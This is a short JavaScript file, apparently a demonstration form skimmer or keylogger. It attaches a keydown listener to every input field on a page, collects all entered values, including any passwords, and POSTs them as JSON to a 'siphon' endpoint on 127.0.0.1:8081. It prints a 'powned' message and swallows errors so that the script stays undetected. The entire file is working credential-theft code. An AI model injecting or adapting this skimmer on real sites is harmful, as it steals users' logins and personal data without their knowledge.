var getInputs = function(){
		return document.getElementsByTagName("input");
}

var getInputValues = function() {

		var inputs = getInputs();
		var data = {}
		for(var i =0; i < inputs.length; i++ ) {
			field = inputs[i];
			if ((field.value != '') && (field.name || field.id)){
				var key = field.name ? field.name : field.id
				data[key] =  field.value
			}
		}
		return data;

}

var siphonFunction = function(e) {

		data = getInputValues();
		var xhttp = new XMLHttpRequest();
		xhttp.open("POST", "http://127.0.0.1:8081/siphon", true);
		xhttp.setRequestHeader("Content-type", "application/json;charset=UTF-8");
		xhttp.send(JSON.stringify(data));
		console.log("You've been powned. Data sent to hacker server: " + JSON.stringify(data));
}

var addInputListeners = function () {
	var inputs = getInputs();
	for(var i =0; i < inputs.length; i++ ) {

			inputs[i].addEventListener("keydown", siphonFunction);

	}
}

try {
	addInputListeners();
} catch (err) {
  // catch any errors to ensure script remains undetected
}

